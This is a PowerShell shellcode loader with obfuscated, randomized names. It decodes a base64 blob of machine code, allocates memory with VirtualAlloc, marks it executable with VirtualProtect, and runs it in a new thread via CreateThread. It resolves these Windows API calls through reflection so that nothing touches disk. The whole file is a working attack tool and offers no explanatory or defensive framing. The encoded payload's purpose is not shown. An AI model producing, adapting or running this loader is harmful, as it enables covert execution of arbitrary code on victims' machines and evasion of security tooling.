 function tMyeg {
         Param ($zw, $qAr)
         $yHy = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }).GetType('Microsoft.Win32.UnsafeNativeMethods')
 
         return $yHy.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String])).Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($yHy.GetMethod('GetModuleHandle')).Invoke($null, @($zw)))), $qAr))
 }
 
 function phwHw {
         Param (
                 [Parameter(Position = 0, Mandatory = $True)] [Type[]] $hi,
                 [Parameter(Position = 1)] [Type] $yjBa = [Void]
         )
 
         $gneV = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
         $gneV.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $hi).SetImplementationFlags('Runtime, Managed')
         $gneV.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $yjBa, $hi).SetImplementationFlags('Runtime, Managed')
 
         return $gneV.CreateType()
 }
 
 [Byte[]]$qqk6 = [System.Convert]::FromBase64String("vtTaiCjdx9l0JPRYMclmuQEBMXAUg+j8A6TKat2fL7NqO0T+e3V7WCVKShYgnRpBVhumcg5fc17SotwYpHr02Vx++32qS0sq3DT6ZvQktOavyPPQzNXJ12jNVE8msfg1DYhUFLRWzpQV5tafdthB5bE4z4+ho1hsjoqpygZiYY5SXW7XpFfZjfNsgYSV/OD1CuZPI9nXlhpKm3DEs74r+s23iLYq/LTrKypM8DkJ7G+6FJrryZNtDeLBxW/5QcNJ3L+k4SiQQAGVymJKm9TnyOmEwqQkl3nUTCjepYLAIVHmHufX5W4Ynql5O9vIwk2v89nOIsfuFhvITN3bUaqizldxatZCZsfLorPmHafrgYe5Ejin8YsctSK+lcscgTrqWLm1KiOV50FKCbfXnYMVXUhK5368UDmU0ETLczochojXrNwMgn0aaNPlNHGyUoDeoWd3NK9QgVTPuezS9pk7eARHuXarAsOUsX/hp0ywLSpUbTXo1+iOSK18LU8i8Hs33a0Xo+iKKnUehRPc60e1W2yxb5caFfbs2z3x9GvGPeuevY2/wc0NtjG/BgVxZmjTLXfezH0Ijwwt6xulxrOteB6t0N5t/WJgUwSgdfuKQo7pl1Kd6j0KWutHYoPsUOgYC2xirKAjUVdu+jXOoZptODcJHcdjEGElu5xeYIOA8yk7kwUHDijpecoaDNiExX9SeOvqcau+T8tVzCRKeqDeVpP32ypxdl7+GlONhY5/bZxRrAMv0/ClSVJsyG/dsdt6De2l5jYuzgwBjcuQgt2quKSeTp6vpSjODlMqD68TQ83Ed54G8VJJS59UW0zOEYGagMGGXte44dC2aoSm/U9b0DLrOQs1YnxcOQT/9hWhlWiErkaU12zDCbF/5BSwFIavSx6r0vX9ZdiThR8we1OGkTQZhm/WM8PDoKNxSecRzpcl6cnqje+9PSTrmV9XsOgZ1lMfFCQpcJrdXr8i05gwiw8V1eRRjpzvcMd2ZQQ/s3SPD5z4RqcWUNInw2dwKYbM0VulivMDyrWSto7y3ttBD5TXUgV7gCeBSIArm+gn2DN8Rj5FVPE8aSNzWyi455qItemgtv4UoC5BnybZ/VV7udxYjg3bWaw5wmIYo4VNl9DaT+2UYA08vjgdHZIE1ldv/djJMowLQUCmYKCY/sJoumYwqg/i69WaSM3AyxQdaSxkpf2sQFu1BFHobL6L81XqTIIFjieJRVxAkkdn/S0dRjU6ZB/wXGTTUMXMlKA4S74DEixs3VyiJMF4n0GnLiBWBa95F9JU7f/9PM+9lIn/efKu+NQxgotmo85eBksI38QZVxss4uUtB5tvTdOWZwH7OLHxDaORSVFJXmYvqFEQabcsJ3FLfOBy7vzfpbvaZ5WO3aEg3Uq7hR5aS8T7")
 [Uint32]$aL_ = 0
 $eixfM = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tMyeg kernel32.dll VirtualAlloc), (phwHw @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr]))).Invoke([IntPtr]::Zero, $qqk6.Length,0x3000, 0x04)
 
 [System.Runtime.InteropServices.Marshal]::Copy($qqk6, 0, $eixfM, $qqk6.length)
 if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tMyeg kernel32.dll VirtualProtect), (phwHw @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool]))).Invoke($eixfM, [Uint32]$qqk6.Length, 0x10, [Ref]$aL_)) -eq $true) {
         $r5fq = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tMyeg kernel32.dll CreateThread), (phwHw @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr]))).Invoke([IntPtr]::Zero,0,$eixfM,[IntPtr]::Zero,0,[IntPtr]::Zero)
         [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((tMyeg kernel32.dll WaitForSingleObject), (phwHw @([IntPtr], [Int32]))).Invoke($r5fq,0xffffffff) | Out-Null
 }
